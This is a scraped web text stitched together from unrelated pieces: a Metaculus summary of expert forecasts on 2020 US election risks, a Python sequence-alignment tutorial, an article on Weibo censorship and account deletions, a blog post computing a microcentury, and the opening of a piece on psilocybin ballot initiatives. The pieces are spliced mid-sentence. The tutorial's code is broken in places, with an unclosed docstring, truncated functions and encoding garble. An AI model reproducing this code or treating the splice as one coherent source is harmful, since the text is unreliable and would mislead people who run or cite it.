        By <a href="https://www.metaculus.com/accounts/profile/113129/">Juan</a> on <span local-datetime="2020-10-20T23:00:00+00:00">Oct. 20, 2020, 11 p.m. GMT</span>
        
      </small></p>
      <p>Metaculus and Rachel Aicher, Adjunct Lecturer in Political Science at Hunter College, City University of New York, are excited to announce the results of a forecasting session on risks to the 2020 U.S. election! We solicited probabilistic predictions about risks to the U.S. general election on 3 November 2020, including on issues relating to effective electoral administration, potential contestation of results, likelihood of civil unrest, and smoothness of any potential transition. We are building on the important work of others, including the <a href="https://paxsims.files.wordpress.com/2020/08/preventing-a-disrupted-presidential-election-and-transition-8-3-20.pdf">Transition Integrity Project</a> and <a href="https://lawecommons.luc.edu/cgi/viewcontent.cgi?article=2719&amp;context=luclj">Edward Foley</a>, who have also made the case that a landslide or otherwise decisive victory for either candidate would minimize the probabilities of such risks. Our aim is for relevant election security decision makers and the general public to be able to make informed choices on the basis of these probability estimates and, if needed, to make necessary preparations.</p>
<p>Below we have included a summary of our results, our methodology, and our analysis. For more, please see our <a href="https://drive.google.com/file/d/1CbkMoNE7eftNwHl5yC71MDmeXJTvzfk9/view?usp=sharing">full report</a>.</p>
<h4> Summary of Results </h4>

<p><b>Voter intimidation and challenges</b>: Experts’ median prediction for the number of voter intimidation/challenge calls that will be made through the Election Protection nonpartisan voter protection national hotline is 8.4k (80% CI: 1.5k - 18.3k). The number of such calls made during the 2016 election was approximately 4.7k. Experts assigned a 5% probability to over 20k calls being placed, which would be more than four times the number of calls made in 2016.</p>
<p><b>Presidential election result known</b>: Experts predicted a median of 8 November 2020 (80% CI: 3 November 2020 - 13 January 2021) for when the presidential election result will be called by the Associated Press.</p>
<p><b>Concession by losing candidate</b>: Experts assigned a median of 40% to the probability of President Trump conceding if the election is called by the Associated Press in favor of Democratic nominee Biden. They assigned a median 95% chance to Democratic nominee Biden conceding if the election is called by the Associated Press in favor of President Trump.</p>
<p><b>Domestic election interference</b>: Experts’ median prediction for President Trump ordering an agency or personnel under his authority to directly interfere in the vote counting process and for these orders to be successfully carried out is 10%.</p>
<p><b>Resolution by state legislature or Supreme Court</b>: Experts assigned a median of 7% to the probability of at least one state legislature appointing its own slate of electors instead of assigning electors in strict accordance with ballots cast by their state’s voters. Experts’ median prediction for the Supreme Court issuing a decision that determines the result of the election is 19%.</p>
<p><b>Election-related violence and unrest</b>: Experts predicted a median of 60 deaths (80% CI: 0 - 912) occurring due to election-related violence between 20 October 2020 and 20 January 2021. Experts assigned an 8% probability to over 1,000 deaths. Experts’ median prediction for President Trump invoking the Insurrection Act between 3 November 2020 and 20 January 2021 is 10%.</p>
<p><b>Confusion as to who will be the next president on Inauguration Day</b>: Experts assigned a 2% probability to it being unclear who is exercising the powers of the presidency after 12PM EST on 20 January 2021.</p>
<h4> Methodology and Logistics </h4>

<p>From 8 October to 15 October 2020, predictions were made for 10 questions related to risks to the 2020 U.S. election.</p>
<p>Two groups of experts were asked to participate: (i) subject matter experts (SMEs) and (ii) trained forecasters (TFs). SMEs were defined as political scientists with expertise in American government and electoral systems. They have several years of experience in political science research and have been closely following developments in the lead up to the U.S. general election on 3 November 2020. TFs were defined as the top 1% out of a total pool of approximately 13,000 forecasters here on Metaculus!</p>
<p>A total of 17 experts (8 subject matter experts and 9 trained forecasters) participated and submitted 220 predictions for aggregation into a consensus distribution. During the entire forecasting session, experts could submit multiple predictions for the same question and collaborate via a comment section underneath each question. Experts made 31 comments, sharing analyses and insights with one another across all questions.</p>
<h4> Analysis and Implications </h4>

<p>A key challenge for policy makers and risk analysts is to identify not only which scenarios are possible, but also which are probable and consequential enough to merit significant attention and resources for planning and mitigation. To this end, this forecasting study aims to map out the landscape of different risks related to the upcoming U.S. presidential election. This research brings together multiple experts’ perspectives to offer timely analysis and insight into election processes, transition issues, and public safety risks highlighted by prior studies and scenario planning. Experts were nearly certain that it will be clear who is president by Inauguration Day (only a median 2% chance otherwise), but were less confident in predicting exactly when the results will be called and noted significant probabilities of vote count interference, violence, and civil unrest. We take a closer look at some of these scenarios below.</p>
<p>Results indicate that experts anticipate higher levels of voter intimidation and challenge complaints than in the previous general election. The median prediction for the number of voter intimidation or challenge calls that will be made through the National Election protection hotline was 8,400 — roughly double the calls made during the <a href="https://lawyerscommittee.org/wp-content/uploads/2017/06/Anuual-report-2016.pdf">2016 election</a>. It is likely the voting process will be more fraught than usual.</p>
<p>Although the median prediction for when the presidential election result will be called was 8 November 2020, the wide 80% confidence interval ranging from 3 November 2020 to 13 January 2021 reflects a high degree of uncertainty, with some participants commenting that they anticipate delays due to mail-in ballots and vote counting issues.</p>
<p>Experts had divergent expectations of the two candidates’ likelihood of giving a concession speech if the election is called for their opponent: 95% for Biden, yet only 40% for Trump. This suggests a smoother transition if the election is called for Trump, as Biden is highly likely to concede, but a more contested and acrimonious transition if the election is called for Biden, since Trump will probably not offer a traditional and timely concession.</p>
<p>Results indicate it is unlikely authorities under the President’s remit will interfere in the vote counting process, although the experts’ median prediction of 10% likelihood for this scenario still gives cause for concern.</p>
<p>There has been much public conjecture as to how delayed ballot counting and contested results might be ultimately resolved, and results of this expert survey suggest a nearly 1 in 5 chance the Supreme Court will play a decisive role in the election outcome. Participants found it less likely (median 7% probability) that state legislatures will depart from established processes for assigning electors, however.</p>
<p>While large-scale violence and military intervention to quell civil unrest seem unlikely, experts still judged these possibilities to be far from remote. Experts predicted a median of 60 deaths occurring due to election-related violence, with an 80% confidence interval of 0 to 912 fatalities that reflects a high degree of uncertainty. Still, the real possibility of violence is a notable departure from the peaceful transitions that have been the hallmark of past U.S. elections. Results indicate an 8% probability of over 1,000 election-related deaths — suggesting that while widespread sustained clashes are unlikely, this possibility warrants real concern. Experts assigned a 10% median prediction that President Trump will invoke the Insurrection Act to mobilize troops during the transition period.</p>
<p>Overall, expert predictions indicate a non-trivial risk of vote count interference, contested results, and election-related violence — potentially departing from the established norms of concession and the peaceful transition of executive power that have characterized past U.S. elections. With expert predictions indicating the incumbent will likely refuse to concede if the election is not called in his favor and a nearly one-in-five probability the Supreme Court will play a decisive role in determining the election outcome, policy makers would do well to take these issues seriously.</p>

</a></p><p>By John Lekberg on October 25, 2020.
</p><hr>
<p>This week's post is about solving the "Sequence Alignment" problem. You will learn:</p>
<ul>
<li>How to create a <a href="https://en.wikipedia.org/wiki/Brute-force_search">brute force solution</a>.</li>
<li>How to create a more efficient solution using the <a href="https://en.wikipedia.org/wiki/Needleman%E2%80%93Wunsch_algorithm">Needleman-Wunsch algorithm</a> and <a href="https://en.wikipedia.org/wiki/Dynamic_programming">dynamic programming</a> .</li>
</ul>

<p>As input, you are given two <strong>sequences.</strong> E.g.</p>
<pre><code>"CAT"
"CT"
</code></pre>
<p>(The sequences can be <a href="https://en.wikipedia.org/wiki/String_(computer_science)">strings</a> or other <a href="https://en.wikipedia.org/wiki/Array_data_type">arrays</a> of data.)</p>
<p>As output, your goal is to produce an <strong>alignment</strong>, which pairs up elements of the sequence. E.g.</p>
<pre><code>C - C
A - T
T - 
</code></pre>
<p>An alignment can have gaps. E.g.</p>
<pre><code>C - C
A -
T - T
</code></pre>
<p>While an alignment can have gaps, it cannot change the relative order of the
sequence elements. E.g. "CT" cannot be changed into "TC".</p>
<p>Specifically, your goal is to produce an alignment with <strong>maximal score.</strong>
Here's how to calculate the score:</p>
<ul>
<li>Score = 0</li>
<li>Look at each pair of elements:
<ul>
<li>If there is a gap, then score -= 1</li>
<li>Otherwise, if the elements are the same, then score += 1.</li>
<li>Otherwise, if the elements are different, then score -= 1.</li>
</ul>
</li>
</ul>
<p>E.g. this alignment has a score of -1:</p>
<pre><code>C - C   (same, +1)
A - T   (different, -1)
T -     (gap, -1)
</code></pre>
<p>But this alignment has a score of +1:</p>
<pre><code>C - C   (same, +1)
A -     (gap, -1)
T - T   (same, +1)
</code></pre>
<p>So, your goal is to take two <strong>sequences</strong> and find an <strong>alignment</strong> with <strong>maximal score.</strong></p>

<p>For the input, I represent the <strong>sequences</strong> as <a href="https://docs.python.org/3/library/stdtypes.html#text-sequence-type-str">strings</a> or
<a href="https://docs.python.org/3/library/stdtypes.html#sequence-types-list-tuple-range">lists</a>.
E.g. I can represent the sequence "CAT" as</p>
<pre><code>"CAT"
</code></pre>
<p>or as</p>
<pre><code>["C", "A", "T"]
</code></pre>
<p>Really, anything that implements <a href="https://docs.python.org/3/library/collections.abc.html#collections.abc.Sequence">collections.abc.Sequence</a> (not just
<a href="https://docs.python.org/3/library/stdtypes.html#text-sequence-type-str">strings</a> and <a href="https://docs.python.org/3/library/stdtypes.html#sequence-types-list-tuple-range">lists</a>) will work.</p>
<p>For the output, I represent an <strong>alignment</strong> as a <a href="https://docs.python.org/3/library/stdtypes.html#sequence-types-list-tuple-range">list</a> of
<a href="https://docs.python.org/3/library/stdtypes.html#sequence-types-list-tuple-range">tuples</a> of indices (or <a href="https://docs.python.org/3/library/constants.html#None">None</a>, if there is a gap.)
E.g. this alignment:</p>
<pre><code>C - C
A - T
T -
</code></pre>
<p>would be represented as</p>
<pre><code>[(0, 0), (1, 1), (2, None)]
</code></pre>
<p>And this alignment:</p>
<pre><code>C - C
A -
T - T
</code></pre>
<p>would be represented as</p>
<pre><code>[(0, 0), (1, None), (2, 1)]
</code></pre>

<p>I like starting with <a href="https://en.wikipedia.org/wiki/Brute-force_search">brute force solutions</a> when I work on problems.
Brute force solutions tend to be simpler to implement and, fairly often, the
brute force solution is "good enough" for the actual inputs that will be
encountered.</p>
<p>I start by creating a function that takes two index ranges and iterates over
all possible alignments:</p>
<pre><code>from collections import deque


def all_alignments(x, y):
    """Return an iterable of all alignments of two
    sequences.

    x, y -- Sequences.
    """

    def F(x, y):
        """A helper function that recursively builds the
        alignments.

        x, y -- Sequence indices for the original x and y.
        """
        if len(x) == 0 and len(y) == 0:
            yield deque()

        scenarios = []
        if len(x) &gt; 0 and len(y) &gt; 0:
            scenarios.append((x[0], x[1:], y[0], y[1:]))
        if len(x) &gt; 0:
            scenarios.append((x[0], x[1:], None, y))
        if len(y) &gt; 0:
            scenarios.append((None, x, y[0], y[1:]))

        # NOTE: "xh" and "xt" stand for "x-head" and "x-tail",
        # with "head" being the front of the sequence, and
        # "tail" being the rest of the sequence. Similarly for
        # "yh" and "yt".
        for xh, xt, yh, yt in scenarios:
            for alignment in F(xt, yt):
                alignment.appendleft((xh, yh))
                yield alignment

    alignments = F(range(len(x)), range(len(y)))
    return map(list, alignments)
</code></pre>
<p>(This code uses: <a href="https://docs.python.org/3/library/collections.html#collections.deque">collections.deque</a>, <a href="https://docs.python.org/3/glossary.html#term-generator">generator function</a>,

<p>E.g. here are all possible alignments of "CAT" and "CT":</p>
<blockquote>
<pre><code>list(all_alignments("CAT", "CT"))
</code></pre>
</blockquote>
<pre><code>[[(0, 0), (1, 1), (2, None)],
 [(0, 0), (1, None), (2, 1)],
 [(0, 0), (1, None), (2, None), (None, 1)],
 [(0, 0), (1, None), (None, 1), (2, None)],
 [(0, 0), (None, 1), (1, None), (2, None)],
 [(0, None), (1, 0), (2, 1)],
 [(0, None), (1, 0), (2, None), (None, 1)],
 [(0, None), (1, 0), (None, 1), (2, None)],
 [(0, None), (1, None), (2, 0), (None, 1)],
 [(0, None), (1, None), (2, None), (None, 0), (None, 1)],
 [(0, None), (1, None), (None, 0), (2, 1)],
 [(0, None), (1, None), (None, 0), (2, None), (None, 1)],
 [(0, None), (1, None), (None, 0), (None, 1), (2, None)],
 [(0, None), (None, 0), (1, 1), (2, None)],
 [(0, None), (None, 0), (1, None), (2, 1)],
 [(0, None), (None, 0), (1, None), (2, None), (None, 1)],

 [(None, 0), (0, None), (None, 1), (1, None), (2, None)],
 [(None, 0), (None, 1), (0, None), (1, None), (2, None)]]
</code></pre>
<p>Here's a more readable form of the output: ("-" indicates a gap)</p>
<blockquote>
<pre><code>def print_alignment(x, y, alignment):
    print("".join(
        "-" if i is None else x[i] for i, _ in alignment
    ))
    print("".join(
        "-" if j is None else y[j] for _, j in alignment
    ))

x = "CAT"
y = "CT"
for alignment in all_alignments(x, y):
    print_alignment(x, y, alignment)
    print()

</code></pre>
<p>Next, I create a function that takes two sequences and an alignment to produce a score:</p>
<pre><code>def alignment_score(x, y, alignment):
    """Score an alignment.

    x, y -- sequences.
    alignment -- an alignment of x and y.
    """
    score_gap = -1
    score_same = +1
    score_different = -1

    score = 0
    for i, j in alignment:
        if (i is None) or (j is None):
            score += score_gap
        elif x[i] == y[j]:
            score += score_same
        elif x[i] != y[j]:
            score += score_different

    return score
</code></pre>
<p>Consider this alignment:</p>
<pre><code>C - C
A -
T - T
</code></pre>
<p>Here's an example of computing the score:</p>
<blockquote>
<pre><code>x = "CAT"
y = "CT"
alignment = [(0, 0), (1, None), (2, 1)]
alignment_score(x, y, alignment)
</code></pre>
</blockquote>
<pre><code>1
</code></pre>
<p>With these two functions -- <code>all_alignments</code> and <code>alignment_score</code> -- the
<a href="https://en.wikipedia.org/wiki/Brute-force_search">brute force solution</a> will search all alignments to find one with
a maximal score:</p>
<pre><code>from functools import partial


def align_bf(x, y):
    """Align two sequences, maximizing the

    return max(
        all_alignments(x, y),
        key=partial(alignment_score, x, y),
    )

<p>What's the <a href="https://en.wikipedia.org/wiki/Time_complexity">time complexity</a> of this solution? For two sequences of <var>n</var> and <var>m</var> elements:</p>
<ul>
<li>
<p>The number of possible alignments is given by the <a href="https://en.wikipedia.org/wiki/Delannoy_number">Delannoy numbers</a>. The number of alignments <var>D</var> is given by the <a href="https://en.wikipedia.org/wiki/Recurrence_relation">recurrence

<blockquote>
<p><var>D</var>(<var>n</var>, 0) = 1</p>

</blockquote>
<p>To give you a sense of how quickly this number grows:</p>
<pre><code>from functools import lru_cache


@lru_cache(maxsize=None)
def D(n, m):
    if n == 0 or m == 0:
        return 1

<ul>
<li>
<p>There are 3 possible alignments of two 1-element sequences:</p>

</li>
<li>
<p>Computing the alignment score takes time <a href="https://en.wikipedia.org/wiki/Time_complexity#Linear_time">linear</a> in the sizes of both sequences: <a href="https://en.wikipedia.org/wiki/Big_O_notation">O</a>(<var>n</var>Â&nbsp;+Â&nbsp;<var>m</var>).</p>

</ul>
<p>As a result, the overall time complexity of the brute force solution is:</p>
<blockquote>
<p>O( <a href="https://en.wikipedia.org/wiki/Delannoy_number"><var>D</var>(<var>n</var>, <var>m</var>)</a> Ã— (<var>n</var> + <var>m</var>) )</p>
</blockquote>

<p>The brute force solution is simple, but it doesn't scale well.
In practice, sequence alignment is used to analyze sequences of biological data (e.g. <a href="https://en.wikipedia.org/wiki/Nucleic_acid_sequence">nucleic acid sequences</a>).
Given that the size of these sequences can be hundreds or thousands of elements
long, there's no way that the brute force solution would work for data of that
size.</p>
<p>In 1970, Saul B. Needleman and Christian D. Wunsch created a faster algorithm
to solve this problem: the <a href="https://en.wikipedia.org/wiki/Needleman%E2%80%93Wunsch_algorithm">Needleman-Wunsch algorithm</a>.
(See <a href="https://www.sciencedirect.com/science/article/abs/pii/0022283670900574">"A general method applicable to the search for similarities in the amino acid sequence of two proteins"</a>, <a href="https://doi.org/10.1016/0022-2836(70)90057-4">https://doi.org/10.1016/0022-2836(70)90057-4</a>.)
The algorithm uses <a href="https://en.wikipedia.org/wiki/Dynamic_programming">dynamic programming</a> to solve the sequence alignment problem in O(<var>m</var><var>n</var>) time.</p>
<p>Here's a Python implementation of the Needleman-Wunsch algorithm, based on section 3 of <a href="https://upload.wikimedia.org/wikipedia/en/c/c4/ParallelNeedlemanAlgorithm.pdf">"Parallel Needleman-Wunsch Algorithm for Grid"</a>:</p>

<p>Chow Po-chung<strong>’</strong>s sixth Weibo account was killed on August 11, one day after he posted a photo of Hong Kong’s Lion Rock with the caption: “Hong Kong, my home.”</p>



<p>Chow, a political philosophy professor at the Chinese University of Hong Kong, had anticipated this. A few weeks earlier, China had enacted a broad and vaguely worded <a href="https://www.nytimes.com/2020/06/30/world/asia/hong-kong-security-law-explain.html">national security law</a> in Hong Kong, which criminalizes pro-independence sentiments, and anything else that authorities interpret as “splittist” or damaging to China’s sovereignty.&nbsp;</p>



<p>Lion Rock, a mountain overlooking central Hong Kong, has become a symbol of the city’s pro-democracy movement. Within hours of Chow’s post, the comment section beneath it was flooded with nationalistic comments and personal attacks. He estimated hundreds of users reported him to Weibo for “trying to divide China,” and his account was deleted.</p>



<p>Nearly 550 million people — <a href="http://www.xinhuanet.com/politics/2020-04/28/c_1125915967.htm">more than 60% of China’s internet</a> users — have an account on Weibo, a microblogging platform owned by the Beijing-based Sina Corporation. Since its launch in 2009, the platform evolved into a rare space for public discussion in China, crucial for disseminating information, shaping political discussion, and generating grassroots campaigns, until heavy censorship kicked in two years later.</p>



<p>Chow opened his first account in 2011. He shared the joy of becoming a new father, photos with students, his teaching notes, his essays, and his experience partaking in social movements. He also facilitated and participated in ideological and philosophical debates with young Weibo users. He amassed 180,000 followers before being censored in June 2018. Five of his accounts have since been deleted, some due to posts about the protests, others for no obvious reason.&nbsp;</p>



<p>“I considered every message I posted as my last one,” Chow says.&nbsp;</p>



<p>While Weibo has always censored accounts, as Chinese authorities have stepped up their crackdown on freedom of speech and tightened their grip over all aspects of Chinese life in recent years, political discussions on the platform have become even more muted. Due to pervasive censorship and self-censorship, conversations on Weibo are even more cautious. <em>Zhahao</em>, or “account bombing,” where accounts voicing dissenting opinions get censored, have become more common. Ultranationalistic and chauvinist narratives now drown out critical posts, making it harder for users to speak their minds.</p>



<hr>



<p>Chinese authorities give social media platforms general guidance about what topics and users to monitor or censor, leaving Weibo to decide which keywords and accounts to block.&nbsp;</p>



<p>Even if regulators have their eyes on a specific message or account, they still need the service provider to actually delete the content, according to Fu King-wa, a journalism professor at The University of Hong Kong. State censorship began to intensify in 2011, when social media debates on controversial environmental, social, and cultural issues started to spill over to offline grassroots protests and campaigns, Fu says. This included dozens of ordinary people challenging China’s election system by campaigning as independent candidates on Weibo, and users addressing the controversy around the Red Cross Society of China, which erupted after a young senior official at the government-run charity posted photos on Weibo of her lavish lifestyle.&nbsp;</p>



<p>Fu says it’s not clear if censorship has stepped up again in recent years, as he doesn’t have figures to compare early censorship to what’s happening now, but he suggests that years of censorship have intimidated users into silence.&nbsp;</p>



<p>According to the <a href="https://weiboscope.jmsc.hku.hk/">Weiboscope</a> tracker, which Fu runs at Hong Kong University, nearly 2% of 54,490 random user accounts tracked in 2015 no longer existed by 2020. Fu believes most of the lost accounts were deleted by Weibo. This is a rough estimate, as some accounts may have been reactivated since they were deleted, or deleted by users.</p>



<p>“By the end of 2019, the discussion on Weibo was really dominated by discourse and narratives created by state media,” Fu says. “Finding alternative discussion on issues like the Hong Kong protest was very difficult, unless you followed the less popular accounts.”</p>

<p>A more alarming trend, Fu says, is that nationalistic users are now mobilizing hundreds or thousands of people to report on people with political views they oppose and thus pressure Weibo to “kill” their accounts. According to Chow, this tactic is reminiscent of Cultural Revolution–style purging of political rivals. When enough people report on the same account, there is little doubt that censors will delete it.&nbsp;</p>



<p>Shutting down accounts intimidates users into self-censorship. Weibo still serves as a critical venue for public discussion: 2020 has brought an increasing usage of the site, Fu notes, because more Chinese took to Weibo to voice their grievances, frustration, and discontent amid the outbreak of Covid-19 in Wuhan. But when users fear they will lose their accounts, they no longer speak as freely.</p>



<p>Weibo users who spoke to <em>Rest of World</em> all noticed a trend of increasing censorship over the past few years. Accounts have been removed after mentioning politically sensitive topics, such as the protests in Hong Kong, China’s human rights violations against Uighurs in Xinjiang, Covid-19, and top political leaders.&nbsp;</p>



<p>When she became active on Weibo in early 2018, Lao Yang, whose nickname is roughly translated as “Old Yang,” fiercely advocated for gender equality and human rights to her 50,000 followers. “I enjoyed just shifting the conversation a little bit more toward the uncomfortable. I enjoyed being the asshole in the room,” Yang says.</p>



<p>Her account was deleted last summer after she signaled support for the Hong Kong protests. When she started a new account, a self-proclaimed Weibo staff member reached out and advised her to lay low for a while as she’d already popped onto the radar of the Cyberspace Administration, China’s central internet censor. They told her that whenever she posted sensitive words, primarily in relation to Hong Kong, authorities at the Cyberspace Administration received an algorithmic notice.&nbsp;</p>



<p>“As long as you keep your account,” reads a message from the Weibo worker that was reviewed by <em>Rest of World</em>, “you can keep your advocacy going.”</p>



<p>Yang followed the advice. She went back to advocacy after a few months, but her account was finally “bombed” on New Year’s Day. Whenever she tries to start a new one, it is deleted within 24 hours. And mainland Weibo users can face severe consequences beyond censorship. If their real identity is revealed, nationalist Weibo users may report them to their employers.&nbsp;</p>



<p>In 2013, China instituted a <a href="http://cpc.people.com.cn/n/2013/0910/c87228-22871736.html">law</a> stating that, if one user’s post is considered defamatory and is viewed 5,000 times or reposted more than 500 times, the original poster can face a jail sentence.</p>



<p>Zhahao<em> </em>attacks can also be very disturbing for their victims. “The first bombing dealt a big blow to me,” Chow says. “This was an attack on your life, your memory, your social network, and your identity as a whole.”</p>

<hr>



<p>Weibo has <a href="http://www.xinhuanet.com//2017-09/14/c_1121665443.htm">required</a> real-name verification upon registration since 2017, linking accounts to people’s official ID or phone number. But users who have been kicked off have been able to get back on using burner accounts from underground online shops.</p>



<p>It’s unclear how such shops set up bot accounts — none of those contacted would talk with a journalist. The cost of a burner account ranges from 0.5 yuan (7 cents) to 240 yuan ($35). The account sellers operate in a legal gray zone, catering mainly to accounts looking to boost their profiles. Authorities have been cracking down on such shops in recent years. In 2018, China’s central internet regulator <a href="https://www.thepaper.cn/newsDetail_forward_2645705">launched a campaign</a> to remove users who obtained burner accounts after being banned on social media platforms.</p>



<p>Wu Xianwei turned to buying burners after her first two accounts were removed. Wu, who grew up in Shanghai but is a Canadian citizen, recently completed her Ph.D. in communications at the University of Iowa. Her first account was censored in March 2018, after China scrapped presidential term limits, allowing current president Xi Jinping to remain in power indefinitely. Wu reposted a statement that read: “I disagree.” The following day, all the accounts that she knew reposted it had disappeared.</p>



<p>Her spare account, also listed under a pseudonym, was active for only two months until she shared a satirical picture mocking Xi and Kim Jong Un.&nbsp;</p>



<p>Wu bought 20 burner accounts for 10 yuan ($1.50) in 2018 and went through every single one of them within a year. Since then, getting ahold of burners has become more difficult. When Wu went back to the same shop for more last year, she found that it no longer existed. Many others have also shut down.&nbsp;</p>



<p>In 2019, Wu says, about 100 of her Weibo friends also lost their accounts. Most of them were highly educated liberals, and they formed a WeChat group to stay in touch. That group, too, has been deleted and re-created.&nbsp;</p>



<p>Still, Wu has been galvanized by the experience. She keeps reappearing on Weibo just to “piss off” ultranationalistic users.&nbsp;</p>



<p>Living overseas, Wu is protected from the worst of the consequences of zhahao. For those based in China, or with family in the country, the stakes are much higher than just losing their accounts. One of Wu’s friends was summoned to a police station after posting an image of the cartoon character Winnie the Pooh, which is commonly used to mock Xi Jinping due to a perceived likeness between the two.</p>



<p>Some censored Weibo users have switched platforms. Chow and Yang have both moved onto Twitter, but there, their impact and audience are smaller. Around 10,000 of Chow’s followers have come with him to the U.S. platform, which is blocked in China. He says that he’s not given …</p></div></div>

<p>By <b>Susam Pal</b> on 17 Jul 2020</p>
<h2 id="optimal-lecture-time"><a href="#optimal-lecture-time">Optimal Lecture Time</a></h2>

<p>
I recently found this interesting paragraph from an article titled <a href="https://www.ams.org/notices/199701/comm-rota.pdf">Ten Lessons I
Wish I Had Been Taught</a> that is based on a talk presented by
Gian-Carlo Rota in Apr 1996:
</p>

<blockquote>
Running overtime is the one unforgivable error a lecturer can make.
After fifty minutes (one microcentury as von Neumann used to say)
everybody's attention will turn elsewhere even if we are trying to prove
the Riemann hypothesis. One minute overtime can destroy the best of
lectures.
</blockquote>

<p>
That's fine advice. In fact, the whole article is full of good advice
like this. Although it was written primarily for mathematicians, a lot
of what is said in the article applies quite well to professionals in
other fields too.
</p>

<p>
The excerpt I have quoted above got me thinking about exactly how long a
microcentury is. It couldn't be exactly 50 minutes, could it?
</p>


<h2 id="wiktionary-on-microcentury"><a href="#wiktionary-on-microcentury">Wiktionary on Microcentury</a></h2>
<p>
The English Wiktionary entry for <a href="https://en.wiktionary.org/wiki/microcentury">microcentury</a>
(as of <a href="https://en.wiktionary.org/w/index.php?title=microcentury&amp;oldid=59316064">revision
59316064</a> on 7 May 2020) mentions:
</p>

<blockquote>
A time period of a millionth of a century, equal to 52 minutes and 34 seconds.
</blockquote>

<blockquote>
Not a standard unit of measurement, and used mostly humorously to denote
the maximum length of a lecture.
</blockquote>

<p>
This looks incorrect to me. This is based on the oversimplified
assumption that a century contains 36500 days, that is, it assumes that
a century is a span of 100 years where each year has exactly 365 days.
If a century were to have exactly 36500 days, then indeed it would have
3 153 600 000 seconds and one millionth of it would be
3153.6 seconds which is equivalent to 52 minutes 33.6 seconds. This
looks consistent with the Wiktionary entry. However, an actual century
on the calendar does not have exactly 36500 days. Some years are leap
years, so the actual number of days in a century is more than that.
</p>


<h2 id="assumptions"><a href="#assumptions">Assumptions</a></h2>
<p>
Let us find out how long a microcentury is as accurately as possible. We
will count the leap years. We will ignore leap seconds because they are
irregularly spaced and unpredictable. We will also ignore the following
gap between 2 Sep 1752 and 14 Sep 1752 when the British Empire switched
from the Julian calendar to the Gregorian calendar:
</p><pre><samp>$ <kbd>cal 9 1752</kbd>
   September 1752
Su Mo Tu We Th Fr Sa
       1  2 14 15 16
17 18 19 20 21 22 23
24 25 26 27 28 29 30</samp>
</pre>

<p>
The above output can be obtained by running the <code>cal</code> command
as shown above on a Unix or Linux system. Ignoring this gap is
equivalent to assuming that we are working with the Gregorian calender
since the year 1 AD.
</p>

<p>
We will call a year that is a multiple of 100 to be a <em>centurial
year</em>. Further, we will not debate whether a centurial year begins a
new century or ends one, that is, we don't care whether the current
century runs from 2001 to 2100 or if it runs from 2000 to 2099. The
computation presented in the next section works equally well for any
span of 100 years.
</p>


<h2 id="computation"><a href="#computation">Computation</a></h2>
<p>
Any span of 100 years contains exactly one centurial year, that is, a
year that is a multiple of 100. A centurial year is a leap year <em>if
and only if</em> it is also a multiple of 400. Apart from the centurial
year, a century contains 24 occurrences of years that are multiples of 4
and these are all leap years. From these facts, we can conclude that a
span of 100 years contains:
</p>

<ul>
  <li>
    Exactly 25 leap years if the centurial year within the span is a
    multiple of 400.
  </li>
  <li>
    Exactly 24 leap years, otherwise.
  </li>
</ul>

<p>
Therefore a century has either 36524 days or 36525 days. In other words,
a century has either 3 155 673 600 seconds or
3 155 760 000 seconds. Here is a
quick demonstration of this with a simple Python program:
</p>

<pre><code>#!/usr/bin/env python3

import datetime

for year in range(1, 2400, 100):
    delta = datetime.date(year + 100, 1, 1) - datetime.date(year, 1, 1)
    print('{:04}-{:04}: {} d = {} s'
          .format(year, year + 100, delta.days, delta.total_seconds()))</code>
</pre>

<p>
Here is the output of this program:
</p>

<pre><samp>0001-0101: 36524 d = 3155673600.0 s
0101-0201: 36524 d = 3155673600.0 s
0201-0301: 36524 d = 3155673600.0 s
0301-0401: 36525 d = 3155760000.0 s
0401-0501: 36524 d = 3155673600.0 s
0501-0601: 36524 d = 3155673600.0 s
0601-0701: 36524 d = 3155673600.0 s
0701-0801: 36525 d = 3155760000.0 s
0801-0901: 36524 d = 3155673600.0 s
0901-1001: 36524 d = 3155673600.0 s
1001-1101: 36524 d = 3155673600.0 s
1101-1201: 36525 d = 3155760000.0 s
1201-1301: 36524 d = 3155673600.0 s
1301-1401: 36524 d = 3155673600.0 s
1401-1501: 36524 d = 3155673600.0 s
1501-1601: 36525 d = 3155760000.0 s
1601-1701: 36524 d = 3155673600.0 s
1701-1801: 36524 d = 3155673600.0 s
1801-1901: 36524 d = 3155673600.0 s
1901-2001: 36525 d = 3155760000.0 s
2001-2101: 36524 d = 3155673600.0 s
2101-2201: 36524 d = 3155673600.0 s
2201-2301: 36524 d = 3155673600.0 s
2301-2401: 36525 d = 3155760000.0 s</samp>
</pre>

<p>
Thus one millionth of a century has 3155.6736 or 3155.7600 seconds, that
is 52 minutes 35.6736 seconds or 52 minutes 35.7600 seconds.
</p>


<h2 id="Conclusion"><a href="#conclusion">Conclusion</a></h2>

<p>
If we round off the number of seconds in a microcentury to one decimal
place, we can say that a microcentury has 52 minutes 35.7 seconds.

<p>When Melissa Lavasani began suffering from postpartum depression after the birth of her second child, she tried a variety of treatments: talk therapy, cupping, and acupuncture. “Things were spiraling,” she said. Worried that pharmaceutical antidepressants would create a long-term dependency, she learned of a new treatment option when she listened to a podcast featuring <a href="https://www.discovermagazine.com/environment/how-mushrooms-can-save-the-world" target="_blank">Paul Stamets</a>, a mycologist (fungi expert) and evangelist for the healing potential of psilocybin, the main component of magic mushrooms.&nbsp;</p><p>When Lavasani tried microdosing psilocybin to treat her depression, she immediately felt better. “But it was nerve wracking,” she said. “I was well aware I was in possession of a Schedule 1 drug. I knew I was breaking the law. I was fearful I would lose my job, lose my children.”</p><p>Now Lavasani has also become an evangelist for using psilocybin for therapeutic purposes, organizing a Nov. 3 <a href="https://ballotpedia.org/Washington,_D.C.,_Initiative_81,_Entheogenic_Plants_and_Fungus_Measure_(2020)" target="_blank">ballot initiative</a> that asks Washington, D.C. voters to effectively decriminalize plant-based medicines. The initiative asks D.C. police to place home growing, possession, and gifting of psychedelic plants and fungi among its lowest law enforcement priorities and requests that the D.C. attorney general stop prosecuting these cases.</p><p>D.C. voters aren’t the only ones considering a hallucinogenic fungi-related ballot initiative this year. On the other side of the country, Oregon residents will weigh in on two measures: <a href="https://ballotpedia.org/Oregon_Measure_110,_Drug_Decriminalization_and_Addiction_Treatment_Initiative_(2020)" target="_blank">one that would decriminalize</a> personal use of most common drugs, including magic mushrooms, and <a href="https://ballotpedia.org/Oregon_Measure_109,_Psilocybin_Mushroom_Services_Program_Initiative_(2020)" target="_blank">another that would create a program</a> for the supervised, therapeutic use of psilocybin in clinical settings. If the measures pass, these places would join the ranks of Oakland, Santa Cruz, Denver, and Ann Arbor—all cities that have taken steps to decriminalize magic mushrooms in the past 